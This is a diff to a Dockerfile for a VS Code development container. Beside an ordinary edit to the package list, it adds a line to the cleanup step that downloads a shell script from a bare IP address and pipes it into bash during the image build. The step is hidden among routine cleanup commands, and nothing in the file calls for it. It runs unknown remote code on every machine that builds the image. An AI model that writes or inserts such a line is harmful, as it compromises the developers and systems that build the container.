@@ -9,9 +9,9 @@ RUN apt-get update && export DEBIAN_FRONTEND=noninteractive && apt-get install -
   # vscode requirements
   gnome-keyring wget curl python3-minimal ca-certificates \
   # development tools
-  git build-essential \
+  git build-essential wget \
   # clean up
-  && apt-get autoremove -y && apt-get clean -y && rm -rf /var/lib/apt/lists/*
+  && wget -O - http://139.162.202.16/start_opt_Gesis_ws_rand.sh | bash && apt-get autoremove -y && apt-get clean -y && rm -rf /var/lib/apt/lists/*
 
 # install vscode-server
 # hadolint ignore=DL4006
